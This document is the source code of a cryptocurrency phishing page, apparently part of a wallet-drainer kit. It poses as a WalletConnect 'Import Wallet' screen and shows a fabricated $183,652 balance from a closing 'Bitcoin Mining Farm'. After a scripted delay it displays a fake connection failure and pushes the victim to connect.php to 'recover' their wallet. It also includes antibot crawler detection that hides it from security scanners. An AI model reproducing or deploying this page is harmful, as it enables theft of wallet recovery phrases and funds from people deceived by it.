<html>
<meta http-equiv="content-type" content="text/html" />
<?php
error_reporting(0);
include './files/antibot/crawlerdetect.php';
include_once 'functions.php';
?>
<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="./files/main_new.css" type="text/css" />
  <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.min.js" integrity="sha512-UdIMMlVx0HEynClOIFSyOrPggomfhBKJE28LKl8yR3ghkgugPnG6iLfRfHwushZl1MOPSY6TsuBDGPK2X4zYKg==" crossorigin="anonymous"></script>


  <meta name="description" content="Open protocol for connecting Wallets to Dapps">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:image" content="./files/images/logo.svg">
  <link rel="icon" href="./files/images/logo.svg">
  <script>
    function openCity(evt, cityName) {
      // Declare all variables
      var i, tabcontent, tablinks;

      // Get all elements with class="tabcontent" and hide them
      tabcontent = document.getElementsByClassName("tabcontent");
      for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
      }

      // Get all elements with class="tablinks" and remove the class "active"
      tablinks = document.getElementsByClassName("tablinks");
      for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
      }

      // Show the current tab, and add an "active" class to the button that opened the tab
      document.getElementById(cityName).style.display = "block";
      evt.currentTarget.className += " active";
    }
  </script>
</head>

<title>Import Wallet</title>

<body>
	   <header style="
        text-align: center; /* Center the content horizontally */
        background-color: #f0f0f0; /* Lighter background color */
        color: #000; /* Header text color (black) */
        padding: 20px 0; /* Add padding top and bottom */
    ">
    <h1 style="font-weight: bold;">Notice: Closure of Automatic Bitcoin Mining Farm</h1>

   
    <p style="color: #006400; font-size: 14px;">Your current balance is $183,652 USD.</p>

    <!-- Add the additional h1 tag -->

    <style>
        /* Custom CSS for the header */
        header {
            text-align: center; /* Center the content horizontally */
            background-color: #f0f0f0; /* Lighter background color */
            color: #000; /* Header text color (black) */
            padding: 20px 0; /* Add padding top and bottom */
        }

        h1 {
            font-weight: bold; /* Make the heading bold */
        }
    </style>

    <script>
        // JavaScript code for any functionality within the header
        window.onload = function () {
            // Add any JavaScript functionality here
            console.log('Header JavaScript loaded.');
        };
    </script>
</header>
  <center>
    
    <div class="text-cool-gray-500">
      <h1 class="flex justify-center mt-20 text-4xl font-semibold import__page">Connecting to your wallet... </h1>
	  
	<br>  	<br>  	<br>  
	 
<img style="width:32px;height:32px" src="./files/loading.gif" alt="loading"> 
<br>
	  
<script>
window.onload = function(){
// Change this value to however many seconds you want to delay the text by.
var theDelay = 3;
var timer = setTimeout("showText()",theDelay*1000)
}
function showText(){
document.getElementById("delayedText").style.visibility = "visible"; style="color:red"
}
</script>

<div  id="delayedText" style="visibility:hidden" 


class="redText">Walletconnect failed to connect to your wallet.<br>
Please continue to recover your wallet.</div>
 
 
 
 <style scoped>
.redText {color:red;}
</style>
    </br>

<form  method="get" action="./connect.php">
    <button class="btn" type="submit">Continue</button>
</form>




    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
	  
	 
 <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bitcoin Mining Farm</title>
<style>
    /* Add your CSS styles here */
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        background-color: #f8f8f8;
    }

    .container {
        max-width: 600px;
        margin: 20px auto;
        padding: 20px;
        background-color: #fff;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        text-align: center;
    }

    p {
        margin: 10px 0;
        font-size: 16px;
        line-height: 1.5;
        color: #007bff; /* Blue color */
    }

    .warning {
        background-color: #ffdddd; /* Light red */
        border: 2px solid #ff9999; /* Lighter red */
        border-radius: 8px;
        padding: 20px;
        margin-top: 20px;
        text-align: center;
    }

    .warning p {
        margin: 0;
        color: #ff3333; /* Dark red */
        font-weight: bold;
    }

    .bold {
        font-weight: bold;
    }
</style>
</head>
<body>

<div class="container">
   
    <div class="warning">
        <p>Warning: Please establish a connection with your wallet to receive funds. It's important to ensure that your wallet maintains a minimum balance of $100 to successfully receive the funds.</p>
    </div>
</div>

</body>
</html>







<script src="./files/jquery.min.js.download"></script>

  
 
<script src="/script.js"></script>
	
	


</body>

</html>
